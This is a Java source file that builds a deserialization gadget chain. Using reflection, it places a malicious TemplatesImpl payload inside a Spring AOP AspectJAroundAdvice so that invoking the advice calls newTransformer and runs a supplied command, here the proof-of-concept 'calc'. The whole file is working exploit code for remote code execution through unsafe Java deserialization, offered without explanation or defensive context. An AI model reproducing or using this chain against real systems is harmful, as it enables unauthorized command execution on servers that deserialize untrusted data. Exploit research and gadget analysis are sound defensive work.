import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;

public class MySpringAOP {
    public static void main(String[] args) throws Exception {
        MySpringAOP mySpringAOP = new MySpringAOP();
        AspectJAroundAdvice aspectJAroundAdvice = mySpringAOP.getAspectJAroundAdvice("calc");
//        aspectJAroundAdvice.invoke()

    }

    public AspectJAroundAdvice getAspectJAroundAdvice(String cmd) throws Exception {
        Object templatesImpl = TemplatesImplNode.makeGadget(cmd);
        SingletonAspectInstanceFactory singletonAspectInstanceFactory = new SingletonAspectInstanceFactory(templatesImpl);
        AspectJAroundAdvice aspectJAroundAdvice = Reflections.newInstanceWithoutConstructor(AspectJAroundAdvice.class);
        Reflections.setFieldValue(aspectJAroundAdvice,"aspectInstanceFactory",singletonAspectInstanceFactory);
        Reflections.setFieldValue(aspectJAroundAdvice,"declaringClass", TemplatesImpl.class);
        Reflections.setFieldValue(aspectJAroundAdvice,"methodName", "newTransformer");
        Reflections.setFieldValue(aspectJAroundAdvice,"parameterTypes", new Class[0]);
//        Method targetMethod = Reflections.getMethod(TemplatesImpl.class,"newTransformer",new Class[0]);
//        Reflections.setFieldValue(aspectJAroundAdvice,"aspectJAdviceMethod",targetMethod);

        AspectJExpressionPointcut aspectJExpressionPointcut = new AspectJExpressionPointcut();
        Reflections.setFieldValue(aspectJAroundAdvice,"pointcut",aspectJExpressionPointcut);
        Reflections.setFieldValue(aspectJAroundAdvice,"joinPointArgumentIndex",-1);
        Reflections.setFieldValue(aspectJAroundAdvice,"joinPointStaticPartArgumentIndex",-1);
        return aspectJAroundAdvice;
    }
}
